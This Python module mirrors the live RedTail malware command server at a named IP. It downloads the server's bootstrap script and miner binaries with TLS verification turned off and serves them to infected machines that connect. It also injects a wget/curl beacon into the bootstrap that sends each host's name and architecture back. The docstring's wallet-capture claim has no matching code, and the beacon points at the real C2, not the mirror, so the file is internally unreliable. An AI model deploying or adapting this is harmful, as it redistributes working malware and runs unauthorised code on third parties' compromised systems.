"""
Deceptive C2 Mirror — impersonates the RedTail C2 (217.60.195.113).
Syncs bootstrap + binaries, hosts them with tracking modifications.
Any zombie connecting to our mirror gets logged and their wallet captured.

Architecture:
  /sh       → Poisoned bootstrap (adds tracking beacon)
  /clean    → Identical copy
  /x86_64, /i686, /aarch64, /arm7 → Identical copies
  /track    → Tracking endpoint (zombies phone home)
"""

import os, time, hashlib, json, subprocess, threading

REAL_C2 = os.environ.get("C2_MIRROR_SOURCE", "https://217.60.195.113")
MIRROR_DIR = os.environ.get("C2_MIRROR_DIR", "/data/c2_mirror")
TRACKING_FILE = os.environ.get("C2_TRACKING", "/data/c2_tracking.jsonl")
SYNC_INTERVAL = int(os.environ.get("C2_SYNC_INTERVAL", "3600"))  # 1 hour

os.makedirs(MIRROR_DIR, exist_ok=True)

FILES = ["sh", "clean", "x86_64", "i686", "aarch64", "arm7"]
_tracking_beacon = None


def get_beacon_url():
    """Generate unique tracking beacon for this deployment."""
    return f"{REAL_C2}/track?id={hashlib.md5(b'win443').hexdigest()[:12]}"


def download_file(filename):
    """Download a file from the real C2."""
    import urllib.request
    url = f"{REAL_C2}/{filename}"
    try:
        req = urllib.request.Request(url)
        import ssl; ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
        with urllib.request.urlopen(req, timeout=15, context=ctx) as resp:
            return resp.read()
    except Exception as e:
        print(f"[c2-mirror] Download {filename} failed: {e}", flush=True)
        return None


def build_poisoned_bootstrap(original):
    """Modify the bootstrap script to phone home with system info."""
    beacon_url = get_beacon_url()
    
    # The original bootstrap calls ./$FILENAME $1 at the end
    # We add a line before that to phone home
    tracking_line = f"""
# --- WIN443 TRACKING BEACON ---
(wget --no-check-certificate -qO- "{beacon_url}&campaign=$1&arch=$(uname -mp)&host=$(hostname)" 2>/dev/null || 
 curl -sk "{beacon_url}&campaign=$1&arch=$(uname -mp)&host=$(hostname)" 2>/dev/null) &
# --- END BEACON ---
"""
    
    # Insert tracking before the binary execution
    if b"./$FILENAME $1" in original:
        poisoned = original.replace(
            b"./$FILENAME $1 >/dev/null 2>&1",
            tracking_line.encode() + b"./$FILENAME $1 >/dev/null 2>&1"
        )
    else:
        # Append at the end as fallback
        poisoned = original + tracking_line.encode()
    
    return poisoned


def sync_c2():
    """Sync all files from real C2 to mirror directory."""
    results = {}
    for fname in FILES:
        data = download_file(fname)
        if data:
            sha = hashlib.sha256(data).hexdigest()
            fpath = os.path.join(MIRROR_DIR, fname)
            
            # Check if changed
            old_sha = None
            if os.path.exists(fpath):
                with open(fpath, "rb") as f:
                    old_sha = hashlib.sha256(f.read()).hexdigest()
            
            if fname == "sh" and old_sha != sha:
                # Poison the bootstrap
                data = build_poisoned_bootstrap(data)
                sha = hashlib.sha256(data).hexdigest()
            
            with open(fpath, "wb") as f:
                f.write(data)
            
            results[fname] = {"sha256": sha, "size": len(data), "changed": old_sha != sha}
            print(f"[c2-mirror] Synced {fname}: {len(data)} bytes (SHA:{sha[:12]})", flush=True)
    
    # Save manifest
    manifest = {
        "last_sync": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        "source": REAL_C2,
        "files": results,
    }
    with open(os.path.join(MIRROR_DIR, "manifest.json"), "w") as f:
        json.dump(manifest, f, indent=2)
    
    return results


def track_zombie(params):
    """Log a zombie that phoned home via tracking beacon."""
    entry = {
        "ts": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
        **params,
    }
    with open(TRACKING_FILE, "a") as f:
        f.write(json.dumps(entry) + "\n")
    print(f"[c2-mirror] ZOMBIE TRACKED: {params}", flush=True)


def get_status():
    """Get C2 mirror status for dashboard."""
    manifest_path = os.path.join(MIRROR_DIR, "manifest.json")
    if os.path.exists(manifest_path):
        with open(manifest_path) as f:
            manifest = json.load(f)
    else:
        manifest = {"last_sync": None, "files": {}}
    
    zombie_count = 0
    if os.path.exists(TRACKING_FILE):
        with open(TRACKING_FILE) as f:
            zombie_count = sum(1 for _ in f)
    
    return {
        "source": REAL_C2,
        "status": "online" if os.path.exists(os.path.join(MIRROR_DIR, "sh")) else "not_synced",
        "last_sync": manifest.get("last_sync"),
        "zombies_tracked": zombie_count,
        "files": manifest.get("files", {}),
    }


def start_sync_loop():
    """Background thread that periodically syncs C2 files."""
    def _loop():
        while True:
            try:
                sync_c2()
            except Exception as e:
                print(f"[c2-mirror] Sync error: {e}", flush=True)
            time.sleep(SYNC_INTERVAL)
    
    t = threading.Thread(target=_loop, daemon=True)
    t.start()
    print(f"[c2-mirror] Sync loop started (interval={SYNC_INTERVAL}s)", flush=True)


# HTTP handler for serving mirrored files
def handle_request(path, query_params=None):
    """Serve a mirrored file. Returns (data, content_type) or None."""
    fname = path.lstrip("/").split("?")[0]
    
    if fname == "track":
        # Tracking endpoint - zombie phoned home
        track_zombie(query_params or {})
        return b"OK", "text/plain"
    
    if fname in FILES:
        fpath = os.path.join(MIRROR_DIR, fname)
        if os.path.exists(fpath):
            with open(fpath, "rb") as f:
                data = f.read()
            ctype = "application/octet-stream" if fname != "sh" else "text/plain"
            return data, ctype
    
    return None, None


def start():
    """Initialize C2 mirror and start sync."""
    # Do initial sync
    try:
        sync_c2()
    except Exception as e:
        print(f"[c2-mirror] Initial sync failed: {e}", flush=True)
    
    start_sync_loop()
    print("[c2-mirror] C2 Mirror module started", flush=True)
